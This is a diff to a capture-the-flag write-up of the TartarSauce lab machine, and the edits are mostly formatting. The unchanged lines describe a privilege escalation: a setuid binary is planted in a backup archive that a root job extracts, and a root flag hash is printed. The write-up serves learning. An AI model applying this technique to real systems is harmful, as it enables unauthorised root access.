@@ -291,12 +291,13 @@ The privilege escalation is really challenging, I learnt that if there is a comp
 		- If there is a difference in the content of the archive and `tartarsauce.htb` web directory, the content of the files that are different from each other will be outputed into `/var/backups/onuma_backup_error.txt`
 	1. Monitor when when `backuperer` is executed
 		```
-		pspy32 
-
+		# to sniff processes
+		pspy32
 		# this is better because u can see the exact timing
 		watch -n 1 'systemctl list-timers'
 		```
-	2. Create a backup of `/var/www/html/robots.txt`
+
+	2. Create a backup of `/var/www/html/robots.txt`.
 		```
 		www-data@TartarSauce:/var/www/html$ cat /var/www/robots.txt
 		User-agent: *
@@ -325,7 +326,6 @@ The privilege escalation is really challenging, I learnt that if there is a comp
 		www-data@TartarSauce:/var/www$ cat /var/backups/onuma_backup_error.txt | tail -n 1
 		94950492344b54734ea2550b122def59
 		```
-		</head>
 		<body>
 		<div id="symlink"></div>
 		<script src="/asciinema-player.min.js"></script>
@@ -336,7 +336,6 @@ The privilege escalation is really challenging, I learnt that if there is a comp
 				});
 		</script>
 		</body>
-		</html>
 5. Root Flag
 	```
 	94950492344b54734ea2550b122def59
@@ -385,6 +384,7 @@ The privilege escalation is really challenging, I learnt that if there is a comp
 			└─# ls -la setuid 
 			-rwsr-xr-x 1 root root 15296 Sep 10 00:19 setuid
 			```
+
 	2. Create an archive of `/var/www/html`  on `tartarsauce.htb`, transfer it to `kali`
 	3. On `kali`, extract it, copy `setuid` file into the extracted directory `<your directory>/var/www/html/`
 		```
@@ -418,7 +418,7 @@ The privilege escalation is really challenging, I learnt that if there is a comp
 		onuma@TartarSauce:/var/tmp$ cp /tmp/sauce_web_dir_suid /var/tmp/.3f2d27416c4d4e4
 		```
 	10. Wait for 30seconds
-	11. Proceed to `check/var/www/html` & execute `setuid`
+	11. Proceed to `check/var/www/html` & execute `setuid`.
 		![](Pasted%20image%2020220910011310.png)
 	<html>
 	<head>
@@ -436,6 +436,4 @@ The privilege escalation is really challenging, I learnt that if there is a comp
 	</body>
 	</html>
 
-```
 
-```
